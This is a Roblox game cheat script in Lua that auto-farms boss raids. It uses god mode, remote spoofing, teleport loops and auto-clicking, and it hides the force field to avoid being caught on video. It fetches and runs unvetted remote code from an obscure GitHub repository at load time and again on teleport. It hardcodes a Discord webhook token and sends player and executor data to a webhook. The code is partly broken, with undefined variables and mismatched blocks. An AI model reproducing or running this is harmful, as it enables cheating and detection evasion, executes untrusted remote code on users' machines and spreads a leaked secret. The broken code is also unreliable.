repeat
    task.wait()
until game:IsLoaded()

if not getgenv().FarmLoad then
    getgenv().FarmLoad = true
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zazazazazazazazzzakakao9/ans/refs/heads/main/anna/greece"))()

    pcall(setsimulationradius, 1000)
    local DiscordPing = '<@[Discord]>'
    local SetBoss = '{SETBOSS}'
    print(SetBoss)

    local StartTime = tick()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local RStorage, TService, Tport, Debris, HTTP = 
    game:GetService("ReplicatedStorage"), 
    game:GetService("TweenService"),
    game:GetService("TeleportService"),
    game:GetService("Debris"),
    game:GetService("HttpService")
    
    local ServerRemotes = RStorage:WaitForChild("Remotes"):WaitForChild("Server")
    local ClientRemotes = RStorage:WaitForChild("Remotes"):WaitForChild("Client")

    -- Discord Webhook
    webhook_url = "https://discord.com/api/webhooks/1331040715853008967/b23KEStIJmGG2i2TTKZ9blshI3XqWxNg1UPXs60v3AEwNafIY8lcVNkTX4JapjSQ_kwA"

    -- Error handling for script
    local Success, Error = pcall(function()
    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/zazazazazazazazzzakakao9/ans/refs/heads/main/anna/madagascar"))()')()
    end)

    -- Constants
    local DomainMobs = {"Ocean Curse","Soul Curse","Heian Imaginary Demon"}
    local LuckDrops = {
        Cats ={
            [1] = "Polished Beckoning Cat",
            [2] = "Wooden Beckoning Cat",
            [3] = "Withered Beckoning Cat"
        },
        Once = {
            [1] = "Fortune Gourd",
            [2] = "Snake Charm",
            [3] = "Luck Vial",
            [4] = "Dumplings"
        }
    }
    
    local BossDrops = {
        ["Finger Bearer"] = "Cursed Fragment",
        ["Ocean Curse"] = "Cursed Tentacle",
        ["Volcano Curse"] = "Volcanic Ash",
        ["Soul Curse"] = "Transfigured Human",
        ["Sorcerer Killer"] = "Heavenly Chains",
        ["Heian Imaginary Demon"] = "Demon Blob",
     
    }

    local BossMaterials = {"Cursed Fragment","Cursed Tentacle","Volcanic Ash","Transfigured Human","Heavenly Chains","Demon Blob"}

    -- Teleport
    if game.PlaceId == 10450270085 then
        task.spawn(function()
            while task.wait(10) do
                Tport:Teleport(119359147980471)
            end
        end)
    elseif game.PlaceId == 119359147980471 then
        local SelectedBoss = "Unknown"
        
        pcall(function()
            if readfile("JJI_LastBoss.txt") then
                SelectedBoss = readfile("JJI_LastBoss.txt")
            end
        end)

        task.wait(3)
        while task.wait(1) do
            ServerRemotes:WaitForChild("Raids"):WaitForChild("QuickStart"):InvokeServer("Boss", SelectedBoss , 4 , "Nightmare")
        end
    end

    repeat
        task.wait()
    until LocalPlayer.Character

    -- Local humanoid Func
    local Character = LocalPlayer.Character
    local Root = Character:WaitForChild("HumanoidRootPart")
    
    Root.ChildAdded:Connect(function(C)
        if table.find({"BodyVelocity","BodyPosition","BodyForce"}, C.ClassName) and
            not table.find ({"BGyro","BVelocity","BPosition"}, C.Name) then
            Debris:AddItem(C, 0)
        end    
    end)

    -- Wait For Children of Parent
    local Objects = workspace:WaitForChild("Objects")
    local Mobs = Objects:WaitForChild("Mobs")
    local Spawns = Objects:WaitForChild("Spawns")
    local Drops = Objects:WaitForChild("Drops")
    local Effects = Objects:WaitForChild("Effects")
    local Destructibles = Objects:WaitForChild("Destructibles")

    -- Wait For Children of Parent
    local LootUI = LocalPlayer.PlayerGui:WaitForChild("Loot")
    local Flip = LootUI:WaitForChild("Frame"):WaitForChild("Flip")

    -- Replay script
    local Replay = LocalPlayer.PlayerGui:WaitForChild("ReadyScreen"):WaitForChild("Frame"):WaitForChild("Replay")

    local Combat = ServerRemotes:WaitForChild("Combat")

    -- Remove FX
    Effects.ChildAdded:Connect(function(Child)
        if not table.find({"DomainSphere","DomainInitiate"},Child.Name) then
            Debris:AddItem(Child, 0)
        end
    end)

    game:GetService("Lighting").ChildAdded:Connect(function(Child)
        Debris:AddItem(Child, 0)
    end)

    Destructibles.ChildAdded:Connect(function(Child)
        Debris:AddItem(Child, 0)
    end)

    -- Centering
    local MouseTarget = Instance.new("Frame", LocalPlayer.PlayerGui:FindFirstChildWhichIsA("ScreenGui"))
    MouseTarget.Size = UDim2.new(0, 0, 0, 0)
    MouseTarget.Position = UDim2.new(0.5, 0, 0.5, 0)
    MouseTarget.AnchorPoint = Vector2.new(0.5, 0.5)
    local X, Y = MouseTarget.AbsolutePosition.X, MouseTarget.AbsolutePosition.Y

    -- GodMode With Removing Visuals
    local function Godmode(State)
        Combat:WaitForChild("ToggleMenu"):FireServer(State)
        if State then
            Character:WaitForChild("ForceField").Visible = false -- Just for show, if anyone were to record a video
        end
    end

    -- Skill usage
    local SkillDB = {}
    local function Skill(Name,Raw)
        if Raw then
            Combat:WaitForChild("Skill"):FireServer(Name)
        else
            if not table.find(SkillDB, Name) then
                task.spawn(function()
                    table.insert(SkillDB, Name)
                    print(RS.Skills:FindFirstChild(Name).Cooldown.Value)
                    task.wait(RS.Skills:FindFirstChild(Name).Cooldown.Value)
                    table.remove(SkillDB, table.find(SkillDB, Name))
                end)
                print("Used Skill:", Name)
                repeat task.wait() until not Character.Torso:FindFirstChild("RagdollAttachment")
                Combat:WaitForChild("Skill"):FireServer(Name)
            end
        end
    end

    -- Luck Boost Insertion
    local function DetermineLuckBoosts()
        local Boosts = {}
        local Inventory = LocalPlayer.ReplicatedData.inventory
        if LocalPlayer.ReplicatedData.luckBoost.duration.Value==0 then
            for i,v in LuckDrops.Cats do
                if Inventory:FindFirstChild(v) then
                    if Inventory[v].Value>5 then
                        table.insert(Boosts,v)
                        break
                    end
                end
            end
        end
        for i,v in LuckDrops.Once do
            if Inventory:FindFirstChild(v) then
                if Inventory[v].Value>5 then
                    table.insert(Boosts,v)
                end
            end
        end
        return Boosts
    end

    -- Open Chests
    local function OpenChest()
        for i, v in ipairs(Drops:GetChildren()) do
            if v:FindFirstChild("Collect") then
                fireproximityprompt(v.Collect)
            end
        end
    end

    -- Cutscene detection
    local function InCutscene()
        return workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
    end

    -- Auto Hit
    local function Hit()
        if not (Character.Torso:FindFirstChild("RagdollAttachment") or InCutscene()) then
            Combat.ApplyBlackFlashToNextHitbox:FireServer(1)
            task.wait(0.1)
            Combat:WaitForChild("M2"):FireServer(2)
        else
            print("Paused")
        end
    end

    -- Auto Click
    local function Click(Button)
        Button.AnchorPoint = Vector2.new(0.5, 0.5)
        Button.Size = UDim2.new(50, 0, 50, 0)
        Button.Position = UDim2.new(0.5, 0, 0.5, 0)
        Button.ZIndex = 20
        Button.ImageTransparency = 1
        for i, v in ipairs(Button:GetChildren()) do
            if v:IsA("TextLabel") then
                v:Destroy()
            end
        end
        local VIM = game:GetService("VirtualInputManager")
        VIM:SendMouseButtonEvent(X, Y, 0, true, game, 0)
        task.wait()
        VIM:SendMouseButtonEvent(X, Y, 0, false, game, 0)
        task.wait()
    end

    -- Character Movement
    local BP, BV, BG = function(I, P,Prop,Deriv)
        local BP = I:FindFirstChild("BPosition")
        if not BP then
            BP = Instance.new("BodyPosition")
            BP.Position = P
            BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            BP.P = 3000
            BP.D = 500
            BP.Name = "BPosition"
            if Prop and Deriv then
                BP.P = Prop
                BP.D = Deriv
            end
            BP.Parent = I
        else
            BP.Position = P
        end
    end, function(I, V,Prop,Deriv)
        local BV = I:FindFirstChild("BVelocity")
        if not BV then
            BV = Instance.new("BodyVelocity")
            BV.Velocity = V
            BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            BV.Name = "BVelocity"
            BV.Parent = I
        else
            BV.Velocity = V
        end
    end, function(I, C,Prop,Deriv)
        local BG = I:FindFirstChild("BGyro")
        if not BG then
            BG = Instance.new("BodyGyro")
            BG.CFrame = C
            BG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            BG.Name = "BGyro"
            BG.P = 3000
            BG.D = 100
            BG.Parent = I
        else
            BG.CFrame = C
        end
    end

    -- Targets Boss
    local function Target(Character)
        local Name = Character.Name
        local S, E = pcall(function()
            ClientRemotes:WaitForChild("GetClosestTarget").OnClientInvoke = function()
                if Mobs:FindFirstChild(Name) then
                    return Character.Humanoid
                else
                    return nil
                end
            end
            ClientRemotes:WaitForChild("GetMouse").OnClientInvoke = function()
                return {
                    Hit = Character.PrimaryPart.CFrame,
                    Target = nil, 
                    UnitRay = CFrame.new(Root.Position,Character.PrimaryPart.Position).LookVector
                }
            end
        end)
        
    end

    -- Inventory
    local function AnalyseInventory()
        local MaterialAmount,Sorted = {},{}
        local AllFull = true
        local Inventory = LocalPlayer.ReplicatedData.inventory
        table.foreach(BossMaterials,function(_,v) MaterialAmount[v]=0 end)
        table.foreach(Inventory:GetChildren(),function(_,v) if table.find(BossMaterials,v.Name) then MaterialAmount[v.Name] = v.Value end end)
        table.foreach(MaterialAmount,function(i,v) 
            if v~=999 then AllFull = false end 
            table.insert(Sorted,{i,v})
        end)
        if AllFull then return "Cursed Fragment" end
        table.sort(Sorted,function(a,b) return a[2]>b[2] end)
        return Sorted[#Sorted][1]
    end

    -- Start
    local ScriptLoadingTime = tostring(math.floor((tick() - StartTime) * 10) / 10)
    local LuckBoosts = DetermineLuckBoosts()
    Skill("Demon Vessel: Switch")

    -- Moves To Boss
    local InitialTween = TS:Create(Root, TweenInfo.new(1), {
        CFrame = Spawns.BossSpawn.CFrame
    })
    InitialTween:Play()
    InitialTween.Completed:Wait()

    -- Stop Charcter Movement
    BV(Character.Torso, Vector3.new(0, 0, 0))

    -- wait For Boss to Spawn
    repeat
        task.wait()
    until Mobs:FindFirstChildWhichIsA("Model")
   
    -- Finds boss Mob
    local Boss = Mobs:FindFirstChildWhichIsA("Model").Name

    -- Save Last Boss

    local Overwritten = false
    task.spawn(function()
        for _,v in pairs({"Damage Vial","Damage Gourd","Rage Gourd"}) do
            ServerRemotes:WaitForChild("Data"):WaitForChild("EquipItem"):InvokeServer(v)
            task.wait()
        end

        if LuckBoosts then
            for _,v in pairs(LuckBoosts) do
                ServerRemotes:WaitForChild("Data"):WaitForChild("EquipItem"):InvokeServer(v)
                print("Used Luck Boost",v)
                task.wait()
            end
        end

        local Success, Error = pcall(function()
            writefile("JJI_LastBoss.txt", Boss)
            Overwritten = true
        end)

        if not Success then
            print("Last boss config saving failed:", Error)
        end
    end)

    -- Inventory
    task.spawn(function()
        local Success,Error = pcall(function()
            local Inventory,SpecialGrades,Message,Empty = LocalPlayer.ReplicatedData.inventory,{},"",true
            local Legendary = {"Demon Finger","Demon Blob","Cursed Tentacle","Cursed Fragment","Volcanic Ash","Transfigured Human","Heavenly Chains"}
            
            for _,v in Inventory:GetChildren() do
                local Item = v.Name
                if Item:find("|") and not Item:find("Title") then
                    Item = Item:match("^(.-)|")
                    SpecialGrades[Item] = (SpecialGrades[Item] or 0) + 1
                    Empty = false
                elseif table.find(Legendary, Item) then
                    SpecialGrades[Item] = v.Value
                    Empty = false
                end
            end

        if SetBoss ~= "X" then
            pcall(function()
                repeat task.wait() until Overwritten
                task.wait(0.5)
                writefile("JJI_LastBoss.txt", SetBoss)
            end)

            if Boss ~= SetBoss then
                while task.wait(10) do
                    Tport:Teleport(10450270085)
                end
            end
        end
    end)

    if not Success then
        warn("Error in script:", Error)
    end
end)
        -- Value
        ClientRemotes:WaitForChild("GetFocus").OnClientInvoke = function() return 3 end
        ClientRemotes:WaitForChild("GetDomainMeter").OnClientInvoke = function() return 100 end
        ClientRemotes:WaitForChild("GetBlackFlashCombo").OnClientInvoke = function() return 3 end
        Target(Mobs[Boss])

        -- Stop Domain
        if table.find(Domainable, Boss) then
            repeat
                Skill("Incomplete Domain",true)
                task.wait(0.5)
            until Effects:FindFirstChild("DomainInitiate")
            repeat task.wait() until Effects:FindFirstChild("DomainSphere")
            task.wait(0.3)
        end

        -- Remove Fling
        Mobs[Boss]:WaitForChild("HumanoidRootPart").ChildAdded:Connect(function(k)
            if k.Name ~= "BPosition" then
                Debris:AddItem(k,0)
            end
        end)

        -- Cursed tools / fist
        for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
            if not table.find({"Innates","Skills","Reverse Curse Technique"},v.Name) then
                v.Parent = Character
            end
        end
        if not Character:FindFirstChildWhichIsA("Tool") then
            LocalPlayer.Backpack.Skills.Parent = Character
        end

        -- Starting Moves
        task.wait(0.5)
        Skill("Infinity: Mugen")
        task.wait()
        Skill("Death Sentence")

        -- Kill
        local I = Mobs[Boss]
        task.spawn(function()
            while Mobs:FindFirstChild(Boss) do
                local CF = I.PrimaryPart.CFrame
                Root.CFrame = CF-CF.LookVector*2+CF.UpVector*2
                task.wait()
            end
        end)

        -- Loop GodMode/Hit
        task.spawn(function()
            while Mobs:FindFirstChild(Boss) do
                if not Character:FindFirstChild("ForceField") then
                    Godmode(true)
                end
                BV(I.PrimaryPart, Vector3.new(0,0,0))
                Hit(I.Humanoid)
                task.wait(0.2)
                Combat:WaitForChild("Vent"):FireServer()
            end
        end)
        
        task.spawn(function()
            repeat task.wait() until Replay.Visible
            print("Fail Safe Firing")
            task.wait(10)
            for i = 1, 10, 1 do
                Click(Replay)
                task.wait(1)
            end
        end)
        
        repeat
            task.wait()
        until Drops:FindFirstChild("Chest")
        print("Chests spawned")

        -- Chest Overwrite
        local Items, HasGoodDrops, ChestsCollected = {}, false, 0
        local Success, Error = pcall(function()
            ClientRemotes.CollectChest.OnClientInvoke = function(Chest, Loots)
                if Chest then
                    ChestsCollected = ChestsCollected + 1
                    for _, Item in pairs(Loots) do
                        if table.find({"Special Grade", "Unique"}, Item[1]) then
                            HasGoodDrops = true
                            Item[2] = "**" .. Item[2] .. "**"
                        end
                        table.insert(Items, Item[2])
                    end
                end
                return {}
            end
        end)
        
        task.spawn(function()
            while Drops:FindFirstChild("Chest") or LootUI.Enabled do
                pcall(function()
                    for i, v in pairs(Drops:GetChildren()) do
                        v.PrimaryPart.CFrame = Root.CFrame
                    end
                end)

                if not LootUI.Enabled then
                    OpenChest()
                else
                    repeat
                        Click(Flip)
                    until not LootUI.Enabled
                end
                task.wait()
            end
        end)
        
        repeat
            task.wait()
        until not (Drops:FindFirstChild("Chest") or LootUI.Enabled)

        -- Webhook Loot
        local Success, Error = pcall(function()
            if webhook_url then
                local Executor = (identifyexecutor() or "None Found")
                local Content = ""
                if HasGoodDrops and DiscordPing ~= "None Found" then
                    Content = Content .. DiscordPing
                end
                Content = Content .. "\n-# [Debug Data] " .. "Executor: " .. Executor .. " | Script Loading Time: " ..
                              tostring(ScriptLoading) .. " | Luck Boosts: (" .. tostring(table.concat(LuckBoosts,", ")) ..
                              ") | Chests Collected: " .. tostring(ChestsCollected) .. 
                              " | Send a copy of this data to Manta if there's any issues"
                print("Sending webhook")
                task.wait()
                local embed = {
                    ["title"] = LocalPlayer.Name .. " has defeated " .. Boss .. " in " ..
                        tostring(math.floor((tick() - StartTime) * 10) / 10) .. " seconds",
                    ['description'] = "Collected Items: " .. table.concat(Items, " | "),
                    ["color"] = tonumber(000000)
                }
                request({
                    Url = getgenv().Webhook,
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        ['embeds'] = {embed},
                        ['content'] = Content,
                        ['avatar_url'] = "https://cdn.discordapp.com/attachments/1089257712900120576/1105570269055160422/archivector200300015.png"
                    }),
                    Method = "POST"
                })
                task.wait()
                print("Webhook sent!")
            end  
        end)
